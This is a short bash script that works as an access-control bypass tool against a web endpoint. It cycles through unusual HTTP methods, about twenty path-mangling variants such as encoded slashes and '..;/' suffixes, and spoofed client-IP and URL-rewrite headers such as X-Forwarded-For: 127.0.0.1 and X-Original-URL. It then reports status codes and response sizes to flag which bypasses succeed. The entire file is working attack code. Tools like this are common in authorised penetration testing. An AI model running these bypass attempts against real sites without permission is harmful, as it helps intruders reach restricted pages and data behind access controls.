#!/bin/bash

# Define colors for terminal output
GREEN='\033[0;32m'
RED='\033[0;31m'
NC='\033[0m'  # No Color

# Function to perform an HTTP request
perform_request() {
    local url=$1
    local method=$2
    local headers=$3

    # Perform the curl request and capture HTTP code and size in one go
    response=$(curl -k -s -o /dev/null -A "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36" -iL -w "%{http_code}","%{size_download}" -X "$method" -H "$headers" "$url")
    http_code=$(echo "$response" | cut -d',' -f1)
    size_download=$(echo "$response" | cut -d',' -f2)

    # Colorize output based on HTTP status code
    if [ "$http_code" -eq 200 ]; then
        echo -e " $method ${GREEN}${http_code}${NC} ${size_download} --> $url $headers"
    else
        echo -e " $method $http_code ${size_download} --> $url $headers"
    fi
}

# Handle Ctrl+C (SIGINT) gracefully
trap 'echo -e "\n${RED}Interrupted by user! Exiting...${NC}"; exit 0;' SIGINT

# Main function
main() {
    local base_url=$1
    local path=$2

    echo -e "$base_url $path\n"

    echo "[ HTTP METHOD BYPASS ]"
    methods=("TRACE" "HEAD" "POST" "PUT" "PATCH" "INVENTED" "HACK")

    for method in "${methods[@]}"; do
        perform_request "$base_url/$path" "$method"
    done

    echo -e "\n[ URL BYPASS ]"
    urls=(
        "$base_url/$path"
        "$base_url/./$path"
        "$base_url/*/$path"
        "$base_url/%2f/$path"
        "$base_url/$path;%2f..%2f..%2f"
        "$base_url/%2e/$path"
        "$base_url/$path/."
        "$base_url//$path//"
        "$base_url/./$path/./"
        "$base_url/$path%20"
        "$base_url/$path%09"
        "$base_url/$path?"
        "$base_url/$path.html"
        "$base_url/$path/?anything"
        "$base_url/$path#"
        "$base_url/$path/*"
        "$base_url/$path.php"
        "$base_url/$path.json"
        "$base_url/$path..;/"
        "$base_url/$path;/"
    )

    for url in "${urls[@]}"; do
        perform_request "$url"
    done

    echo -e "\n[ HEADER BYPASS ]"
    headers_list=(
        "X-Originating-IP: 127.0.0.1"
        "X-Forwarded: 127.0.0.1"
        "Forwarded-For: 127.0.0.1"
        "X-Remote-IP: 127.0.0.1"
        "X-Remote-Addr: 127.0.0.1"
        "X-ProxyUser-Ip: 127.0.0.1"
        "X-Original-URL: 127.0.0.1"
        "Client-IP: 127.0.0.1"
        "X-Client-IP: 127.0.0.1"
        "X-Real-IP: 127.0.0.1"
        "True-Client-IP: 127.0.0.1"
        "Cluster-Client-IP: 127.0.0.1"
        "Host: localhost"
        "Host: google.com"
        "X-Original-URL: $path"
        "X-Custom-IP-Authorization: 127.0.0.1"
        "X-Forwarded-For: http://127.0.0.1"
        "X-Forwarded-For: 127.0.0.1:80"
        "X-Rewrite-URL: $path"
        "X-Host: 127.0.0.1"
        "X-Forwarded-Host: 127.0.0.1"
        "Content-Length: 0"
    )

    for header in "${headers_list[@]}"; do
        perform_request "$base_url/$path" "" "$header"
    done
}

# Check for correct number of arguments
if [ "$#" -ne 2 ]; then
    echo -e "${RED}Usage: $0 https://example.com endpoint${NC}"
    exit 1
fi

base_url=$1
path=$2

# Call the main function
main "$base_url" "$path"
